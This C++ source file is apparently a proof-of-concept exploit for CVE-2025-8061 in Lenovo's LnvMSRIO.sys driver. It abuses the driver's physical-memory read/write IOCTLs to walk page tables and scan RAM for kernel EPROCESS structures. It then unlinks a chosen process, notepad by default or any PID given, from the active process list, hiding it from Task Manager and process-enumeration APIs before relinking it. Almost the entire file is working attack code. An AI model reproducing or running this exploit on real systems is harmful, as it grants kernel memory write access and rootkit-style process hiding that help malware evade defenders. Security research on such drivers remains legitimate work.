/*
 * 06_dkom_hide.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — DKOM Process Hiding
 *
 * Technique: Direct Kernel Object Manipulation (DKOM)
 * ────────────────────────────────────────────────────
 * Every live process has an EPROCESS structure in kernel memory.  All
 * EPROCESSes are chained together through a circular doubly-linked list:
 *
 *   EPROCESS + 0x448  →  LIST_ENTRY { Flink, Blink }
 *
 *   Flink  →  next EPROCESS's ActiveProcessLinks  (+0x448)
 *   Blink  →  prev EPROCESS's ActiveProcessLinks  (+0x448)
 *
 * Every user-mode API that enumerates processes (CreateToolhelp32Snapshot,
 * EnumProcesses, NtQuerySystemInformation class 5, Task Manager) walks this
 * list.  If we splice a process out of the list, those APIs become blind to
 * it — but the process keeps running; its EPROCESS, threads, handles, and
 * virtual memory remain fully intact.
 *
 * Unlink (hide):
 *   prev->Flink = target->Flink   (bypass target going forward)
 *   next->Blink = target->Blink   (bypass target going backward)
 *
 * Re-link (restore):
 *   target->Flink = saved_flink
 *   target->Blink = saved_blink
 *   prev->Flink   = target_links_va
 *   next->Blink   = target_links_va
 *
 * EPROCESS offsets  (x64, stable Win10 21H2 → Win11 24H2):
 *   +0x028  DirectoryTableBase (CR3)
 *   +0x440  UniqueProcessId    ULONG_PTR
 *   +0x448  ActiveProcessLinks LIST_ENTRY
 *   +0x5A8  ImageFileName      CHAR[15]
 *
 * Demo flow:
 *   1. Spawn notepad.exe  (or use argv[1] = PID)
 *   2. Prove visible via CreateToolhelp32Snapshot   [BEFORE]
 *   3. Physical-scan RAM → find EPROCESS → read Flink/Blink
 *   4. Unlink EPROCESS from ActiveProcessLinks
 *   5. Prove invisible via CreateToolhelp32Snapshot [AFTER]
 *   6. Prove process still alive via OpenProcess
 *   7. Re-link EPROCESS                             [RESTORE]
 *   8. Prove visible again
 *   9. Terminate notepad
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 06_dkom_hide.cpp /link kernel32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <algorithm>
using std::min;

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME      L"\\\\.\\WinMsrDev"
#define IOCTL_PHYS_READ  0x9c406104u
#define IOCTL_PHYS_WRITE 0x9c40a108u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile: error %lu\n", GetLastError());
        return false;
    }
    printf("[+] Device opened  handle=%p\n", g_dev);
    return true;
}

// ─── Physical R/W ────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn   { UINT64 PA; DWORD AS; DWORD Count; };
struct PhysWriteIn8 { UINT64 PA; DWORD OT; DWORD AS; UINT64 Data; };
#pragma pack(pop)

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && (got == len);
}

static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in = { pa, 8, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

static bool PhysWriteU64(uint64_t pa, uint64_t val)
{
    PhysWriteIn8 in = { pa, 1, 8, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

// ─── Page table walk: VA → PA ─────────────────────────────────────────────────

static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    uint64_t pml4_pa = cr3 & ~0xFFFULL;
    auto idx = [&](int s){ return (va >> s) & 0x1FF; };

    uint64_t e = 0;
    if (!PhysReadU64(pml4_pa + idx(39)*8, &e) || !(e & 1)) return 0;
    uint64_t p = e & 0x000FFFFFFFFFF000ULL;

    if (!PhysReadU64(p + idx(30)*8, &e) || !(e & 1)) return 0;
    if (e & 0x80) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
    p = e & 0x000FFFFFFFFFF000ULL;

    if (!PhysReadU64(p + idx(21)*8, &e) || !(e & 1)) return 0;
    if (e & 0x80) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
    p = e & 0x000FFFFFFFFFF000ULL;

    if (!PhysReadU64(p + idx(12)*8, &e) || !(e & 1)) return 0;
    return (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL);
}

// ─── Get System CR3 ──────────────────────────────────────────────────────────

static uint64_t GetSystemCR3()
{
    MEMORYSTATUSEX ms = { sizeof(ms) }; GlobalMemoryStatusEx(&ms);
    uint64_t top = ((ms.ullTotalPhys + (512ULL<<20)) + 0x1FFFFFULL) & ~0x1FFFFFULL;

    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;

    uint64_t cr3 = 0;
    for (uint64_t pa = 0x100000; pa < top && !cr3; pa += 1<<20) {
        if (pa>=0xC0000000ULL && pa<0x100000000ULL) continue;
        bool any_ok=false;
        for (DWORD pg=0;pg<(1u<<20);pg+=0x1000){
            if(PhysRead(pa+pg,buf+pg,0x1000)) any_ok=true;
            else memset(buf+pg,0,0x1000);
        }
        if (!any_ok) continue;
        for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
            if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
            if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
            uint64_t c = *(uint64_t*)(buf+off+0x28);
            if (c && !(c & 0xFFF)) { cr3 = c; break; }
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);
    return cr3;
}

// ─── Find EPROCESS by PID + name stem ────────────────────────────────────────
//
// Returns the physical address of the matching EPROCESS, or 0 on failure.
// `stem` is the ImageFileName prefix (e.g., "notepad", not "notepad.exe").

static uint64_t FindEprocByPid(DWORD pid, const char *stem)
{
    MEMORYSTATUSEX ms = { sizeof(ms) }; GlobalMemoryStatusEx(&ms);
    uint64_t top = ((ms.ullTotalPhys + (512ULL<<20)) + 0x1FFFFFULL) & ~0x1FFFFFULL;

    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;

    size_t  slen     = strlen(stem);
    uint64_t found_pa = 0;

    for (uint64_t pa = 0x100000; pa < top && !found_pa; pa += 1<<20) {
        if (pa>=0xC0000000ULL && pa<0x100000000ULL) continue;
        bool any_ok=false;
        for (DWORD pg=0;pg<(1u<<20);pg+=0x1000){
            if(PhysRead(pa+pg,buf+pg,0x1000)) any_ok=true;
            else memset(buf+pg,0,0x1000);
        }
        if (!any_ok) continue;
        for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
            // PID match
            if (*(ULONG_PTR*)(buf+off+0x440) != pid) continue;
            // Name match
            if (_strnicmp((char*)(buf+off+0x5A8), stem, slen) != 0) continue;
            // Flink and Blink must be canonical kernel VAs
            uint64_t fl = *(uint64_t*)(buf+off+0x448);
            uint64_t bl = *(uint64_t*)(buf+off+0x450);
            if ((fl >> 48) != 0xFFFF || (bl >> 48) != 0xFFFF) continue;
            // Flink != Blink for a non-trivially-isolated list (sanity)
            if (fl == bl) continue;
            found_pa = pa + off;
            break;
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);
    return found_pa;
}

// ─── Toolhelp: is PID in process snapshot? ───────────────────────────────────

static bool IsVisible(DWORD pid)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32First(snap, &pe)) {
        do { if (pe.th32ProcessID == pid) { found = true; break; } }
        while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

// ─── DKOM save state ──────────────────────────────────────────────────────────

struct DkomSave {
    uint64_t target_links_va; // VA of target's ActiveProcessLinks field
    uint64_t flink_va;        // original Flink (VA of next's links field)
    uint64_t blink_va;        // original Blink (VA of prev's links field)
};

// ─── Hide: unlink EPROCESS from ActiveProcessLinks ───────────────────────────

static bool HideProcess(uint64_t cr3, uint64_t eproc_pa, DkomSave *s)
{
    // Read target's Flink and Blink
    if (!PhysReadU64(eproc_pa + 0x448, &s->flink_va) ||
        !PhysReadU64(eproc_pa + 0x450, &s->blink_va))
    {
        printf("[-] PhysReadU64 Flink/Blink failed\n");
        return false;
    }
    printf("    Flink = 0x%016llX  (→ next's links)\n", s->flink_va);
    printf("    Blink = 0x%016llX  (→ prev's links)\n", s->blink_va);

    // Derive target's own links VA from next->Blink (which points back to target).
    // next->Blink is at flink_va + 8 (Blink is the second UINT64 in LIST_ENTRY).
    uint64_t next_blink_pa = VaToPa(cr3, s->flink_va + 8);
    if (!next_blink_pa) { printf("[-] VaToPa(next_blink) failed\n"); return false; }
    if (!PhysReadU64(next_blink_pa, &s->target_links_va)) {
        printf("[-] Read target_links_va failed\n"); return false;
    }
    if ((s->target_links_va >> 48) != 0xFFFF) {
        printf("[-] target_links_va=0x%016llX sanity fail\n", s->target_links_va);
        return false;
    }
    printf("    target_links_va = 0x%016llX  (EPROCESS VA + 0x448)\n",
           s->target_links_va);

    // PA of prev's Flink slot  =  VaToPa(blink_va + 0)
    // PA of next's Blink slot  =  VaToPa(flink_va + 8)
    uint64_t prev_flink_pa = VaToPa(cr3, s->blink_va);
    uint64_t next_blink_pa2 = VaToPa(cr3, s->flink_va + 8);
    if (!prev_flink_pa || !next_blink_pa2) {
        printf("[-] VaToPa for unlink PAs failed\n"); return false;
    }

    // Splice target out of the list
    PhysWriteU64(prev_flink_pa,  s->flink_va);  // prev->Flink = next's links
    PhysWriteU64(next_blink_pa2, s->blink_va);  // next->Blink = prev's links
    return true;
}

// ─── Unhide: re-link EPROCESS back into ActiveProcessLinks ───────────────────

static bool UnhideProcess(uint64_t cr3, uint64_t eproc_pa, const DkomSave &s)
{
    // Restore target's own Flink/Blink entries (they were not erased, but be explicit)
    PhysWriteU64(eproc_pa + 0x448, s.flink_va);
    PhysWriteU64(eproc_pa + 0x450, s.blink_va);

    // Point prev->Flink and next->Blink back at target
    uint64_t prev_flink_pa  = VaToPa(cr3, s.blink_va);
    uint64_t next_blink_pa  = VaToPa(cr3, s.flink_va + 8);
    if (!prev_flink_pa || !next_blink_pa) {
        printf("[-] VaToPa for re-link failed\n"); return false;
    }
    PhysWriteU64(prev_flink_pa, s.target_links_va);
    PhysWriteU64(next_blink_pa, s.target_links_va);
    return true;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main(int argc, char **argv)
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 06 - DKOM Process Hiding ===\n\n");

    if (!OpenDevice()) return 1;

    // ── Step 1: resolve target PID ───────────────────────────────────────────
    DWORD  target_pid  = 0;
    HANDLE target_proc = nullptr;
    bool   we_spawned  = false;
    char   target_stem[16] = {};

    if (argc >= 2) {
        target_pid = (DWORD)atoi(argv[1]);
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                if (pe.th32ProcessID == target_pid) {
                    const char *nm  = pe.szExeFile;
                    const char *dot = strrchr(nm, '.');
                    size_t len = dot ? (size_t)(dot - nm) : strlen(nm);
                    strncpy_s(target_stem, sizeof(target_stem), nm, min(len, (size_t)15));
                    break;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
        if (!target_stem[0]) {
            printf("[-] PID %lu not found\n", target_pid);
            CloseHandle(g_dev); return 1;
        }
        printf("[+] Target: PID=%lu  name=%s\n\n", target_pid, target_stem);
    } else {
        printf("[*] No PID given — spawning notepad.exe...\n");
        STARTUPINFOA si = {}; si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {};
        if (!CreateProcessA(nullptr, (LPSTR)"notepad.exe",
                            nullptr, nullptr, FALSE,
                            CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi))
        {
            printf("[-] CreateProcess(notepad): %lu\n", GetLastError());
            CloseHandle(g_dev); return 1;
        }
        target_pid  = pi.dwProcessId;
        target_proc = pi.hProcess;
        CloseHandle(pi.hThread);
        we_spawned  = true;
        strncpy_s(target_stem, sizeof(target_stem), "notepad", 7);
        Sleep(600);
        printf("[+] notepad.exe spawned  PID=%lu\n\n", target_pid);
    }

    // ── Step 2: prove visible BEFORE ─────────────────────────────────────────
    printf("[*] Toolhelp32 snapshot BEFORE hide:\n");
    bool vis_before = IsVisible(target_pid);
    printf("    PID %-6lu  visible = %s\n\n",
           target_pid, vis_before ? "YES [confirmed]" : "NO (already gone?)");

    // ── Step 3: get System CR3 ────────────────────────────────────────────────
    printf("[*] Getting System CR3...\n");
    uint64_t cr3 = GetSystemCR3();
    if (!cr3) {
        printf("[-] CR3 not found\n");
        if (we_spawned && target_proc) TerminateProcess(target_proc, 0);
        CloseHandle(g_dev); return 1;
    }
    printf("[+] System CR3 = 0x%016llX\n\n", cr3);

    // ── Step 4: find EPROCESS ────────────────────────────────────────────────
    printf("[*] Scanning RAM for EPROCESS (PID=%lu  stem=%s)...\n",
           target_pid, target_stem);
    uint64_t eproc_pa = FindEprocByPid(target_pid, target_stem);
    if (!eproc_pa) {
        printf("[-] EPROCESS not found\n");
        if (we_spawned && target_proc) TerminateProcess(target_proc, 0);
        CloseHandle(g_dev); return 1;
    }
    printf("[+] EPROCESS PA = 0x%016llX\n\n", eproc_pa);

    // ── Step 5: DKOM unlink ───────────────────────────────────────────────────
    printf("[*] Unlinking from ActiveProcessLinks...\n");
    DkomSave save = {};
    if (!HideProcess(cr3, eproc_pa, &save)) {
        if (we_spawned && target_proc) TerminateProcess(target_proc, 0);
        CloseHandle(g_dev); return 1;
    }
    printf("[+] UNLINKED — process is now invisible to the kernel list walker\n\n");

    // ── Step 6: prove INVISIBLE ───────────────────────────────────────────────
    Sleep(50);
    printf("[*] Toolhelp32 snapshot AFTER hide:\n");
    bool vis_after = IsVisible(target_pid);
    printf("    PID %-6lu  visible = %s\n",
           target_pid, vis_after ? "YES (unlink did not work?)" : "NO  ← HIDDEN");

    // ── Step 7: process still alive ──────────────────────────────────────────
    HANDLE prove = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, target_pid);
    printf("    OpenProcess(%lu) = %s  ← hidden but STILL RUNNING\n\n",
           target_pid,
           prove ? "SUCCESS" : "FAILED (may have exited)");
    if (prove) CloseHandle(prove);

    // ── Step 8: re-link (restore) ─────────────────────────────────────────────
    printf("[*] Re-linking EPROCESS (restoring list integrity)...\n");
    bool relinked = UnhideProcess(cr3, eproc_pa, save);
    printf(relinked ? "[+] RE-LINKED\n\n" : "[-] Re-link failed — system may be unstable, reboot\n\n");

    // ── Step 9: confirm restored ─────────────────────────────────────────────
    Sleep(50);
    printf("[*] Toolhelp32 snapshot AFTER restore:\n");
    bool vis_restored = IsVisible(target_pid);
    printf("    PID %-6lu  visible = %s\n\n",
           target_pid, vis_restored ? "YES [restored]" : "NO (re-link failed?)");

    // ── Step 10: cleanup ──────────────────────────────────────────────────────
    if (we_spawned && target_proc) {
        TerminateProcess(target_proc, 0);
        CloseHandle(target_proc);
        printf("[*] notepad.exe terminated\n");
    }
    CloseHandle(g_dev);

    // ── Summary ───────────────────────────────────────────────────────────────
    printf("\n=== Result ===\n");
    printf("  Before unlink: visible = %s\n", vis_before  ? "YES" : "NO");
    printf("  After  unlink: visible = %s\n", vis_after   ? "YES" : "NO");
    printf("  After relink:  visible = %s\n", vis_restored ? "YES" : "NO");
    if (vis_before && !vis_after && vis_restored)
        printf("\n  [DKOM HIDE + RESTORE  OK]\n");
    else if (vis_before && !vis_after)
        printf("\n  [DKOM HIDE OK — restore may have failed]\n");

    return 0;
}
